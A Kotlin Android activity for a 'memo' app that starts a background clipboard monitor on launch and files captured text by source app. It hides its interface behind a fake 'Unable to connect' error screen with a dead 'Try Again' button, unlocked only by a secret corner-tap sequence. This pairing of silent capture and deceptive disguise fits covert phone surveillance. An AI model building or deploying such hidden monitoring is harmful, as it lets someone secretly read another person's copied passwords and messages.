package com.example.memo

import android.content.Intent
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.animation.core.LinearEasing
import androidx.compose.animation.core.RepeatMode
import androidx.compose.animation.core.animateFloat
import androidx.compose.animation.core.infiniteRepeatable
import androidx.compose.animation.core.rememberInfiniteTransition
import androidx.compose.animation.core.tween
import androidx.compose.foundation.background
import androidx.compose.foundation.gestures.detectTapGestures
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Info
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.input.pointer.pointerInput
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.lifecycle.viewmodel.compose.viewModel
import androidx.navigation.NavType
import androidx.navigation.compose.NavHost
import androidx.navigation.compose.composable
import androidx.navigation.compose.rememberNavController
import androidx.navigation.navArgument
import com.example.memo.service.ClipboardMonitorService
import com.example.memo.ui.MainViewModel
import com.example.memo.ui.screens.*

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)


        // Start clipboard monitor whenever the app is opened
        try {
            startService(Intent(this, ClipboardMonitorService::class.java))
        } catch (_: Exception) {}

        setContent {
            MaterialTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    MemoApp()
                }
            }
        }
    }
}

@Composable
fun MemoApp() {
    var isUnlocked by remember { mutableStateOf(false) }

    if (!isUnlocked) {
        FakeNoInternetScreen(onUnlock = { isUnlocked = true })
    } else {
        val navController = rememberNavController()
        val viewModel: MainViewModel = viewModel()

        NavHost(navController = navController, startDestination = "home") {

            // --- Home Screen ---
            composable("home") {
                val apps by viewModel.distinctApps.collectAsState()
                HomeScreen(
                    apps = apps,
                    onAppClick = { packageName, appName ->
                        viewModel.loadEntriesForApp(packageName)
                        navController.navigate("folder/${packageName}/${appName}")
                    },
                    onSearchClick = { navController.navigate("search") },
                    onSettingsClick = { navController.navigate("settings") }
                )
            }

            // --- Folder Screen ---
            composable(
                route = "folder/{packageName}/{appName}",
                arguments = listOf(
                    navArgument("packageName") { type = NavType.StringType },
                    navArgument("appName") { type = NavType.StringType }
                )
            ) { backStackEntry ->
                val appName = backStackEntry.arguments?.getString("appName") ?: "Unknown App"
                val packageName = backStackEntry.arguments?.getString("packageName") ?: ""
                val entries by viewModel.currentAppEntries.collectAsState()

                FolderScreen(
                    appName = appName,
                    entries = entries,
                    onBackClick = { navController.popBackStack() },
                    onEntryClick = { entryId ->
                        navController.navigate("detail/${entryId}")
                    }
                )
            }

            // --- Entry Detail Screen ---
            composable(
                route = "detail/{entryId}",
                arguments = listOf(navArgument("entryId") { type = NavType.IntType })
            ) { backStackEntry ->
                val entryId = backStackEntry.arguments?.getInt("entryId") ?: -1
                val entries by viewModel.currentAppEntries.collectAsState()
                val entry = entries.find { it.id == entryId }

                EntryDetailScreen(
                    entry = entry,
                    onBackClick = { navController.popBackStack() },
                    onDeleteClick = { id -> viewModel.deleteEntry(id) }
                )
            }

            // --- Search Screen ---
            composable("search") {
                val query by viewModel.searchQuery.collectAsState()
                val results by viewModel.searchResults.collectAsState()

                SearchScreen(
                    query = query,
                    results = results,
                    onQueryChange = { viewModel.setSearchQuery(it) },
                    onEntryClick = { entry ->
                        viewModel.loadEntriesForApp(entry.packageName)
                        navController.navigate("detail/${entry.id}")
                    },
                    onBackClick = {
                        viewModel.setSearchQuery("")
                        navController.popBackStack()
                    }
                )
            }

            // --- Settings Screen ---
            composable("settings") {
                val isCapturing by viewModel.isCapturing.collectAsState()
                val autoDeleteDays by viewModel.autoDeleteDays.collectAsState()

                SettingsScreen(
                    isCapturing = isCapturing,
                    autoDeleteDays = autoDeleteDays,
                    onBackClick = { navController.popBackStack() },
                    onCapturingToggle = { viewModel.setCapturingEnabled(it) },
                    onAutoDeleteChanged = { viewModel.setAutoDeleteDays(it) },
                    onClearAllData = { viewModel.clearAllData() }
                )
            }
        }
    }
}

/**
 * FAKE SCREEN: "Unable to connect to internet"
 * Looks like a genuine connection error page.
 *
 * SECRET UNLOCK:
 * Tap TOP-RIGHT corner 3 times, then BOTTOM-LEFT corner 3 times.
 * No visual feedback — completely invisible to anyone watching.
 */
@Composable
fun FakeNoInternetScreen(onUnlock: () -> Unit) {
    var tapStep by remember { mutableStateOf(0) }
    var screenWidth by remember { mutableStateOf(0f) }
    var screenHeight by remember { mutableStateOf(0f) }

    val zoneSize = 360f // ~120dp at 3x density

    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(Color(0xFFF5F5F5))
            .pointerInput(Unit) {
                screenWidth = size.width.toFloat()
                screenHeight = size.height.toFloat()

                detectTapGestures { offset ->
                    val x = offset.x
                    val y = offset.y
                    val w = screenWidth
                    val h = screenHeight

                    val inTopRight = x > (w - zoneSize) && y < zoneSize
                    val inBottomLeft = x < zoneSize && y > (h - zoneSize)

                    when {
                        tapStep < 3 && inTopRight -> {
                            tapStep++
                        }
                        tapStep >= 3 && inBottomLeft -> {
                            tapStep++
                            if (tapStep >= 6) {
                                onUnlock()
                            }
                        }
                        else -> tapStep = 0
                    }
                }
            },
        contentAlignment = Alignment.Center
    ) {
        Column(
            horizontalAlignment = Alignment.CenterHorizontally,
            modifier = Modifier.padding(40.dp)
        ) {
            // WiFi-off style icon
            Text(
                "📡",
                fontSize = 56.sp
            )

            Spacer(modifier = Modifier.height(24.dp))

            Text(
                "Unable to connect",
                color = Color(0xFF333333),
                fontSize = 20.sp,
                fontWeight = FontWeight.SemiBold
            )

            Spacer(modifier = Modifier.height(8.dp))

            Text(
                "Please check your internet connection and try again. Make sure Wi-Fi or mobile data is turned on.",
                color = Color(0xFF757575),
                fontSize = 14.sp,
                textAlign = TextAlign.Center,
                lineHeight = 20.sp
            )

            Spacer(modifier = Modifier.height(32.dp))

            // Fake "Try Again" button that does nothing
            Button(
                onClick = { /* Does nothing — purely decorative */ },
                shape = RoundedCornerShape(24.dp),
                colors = ButtonDefaults.buttonColors(
                    containerColor = Color(0xFF1A73E8)
                ),
                modifier = Modifier
                    .fillMaxWidth()
                    .height(48.dp)
            ) {
                Text("Try Again", fontSize = 15.sp, color = Color.White)
            }

            Spacer(modifier = Modifier.height(16.dp))

            Text(
                "Error code: ERR_INTERNET_DISCONNECTED",
                color = Color(0xFFBDBDBD),
                fontSize = 11.sp
            )
        }
    }
}

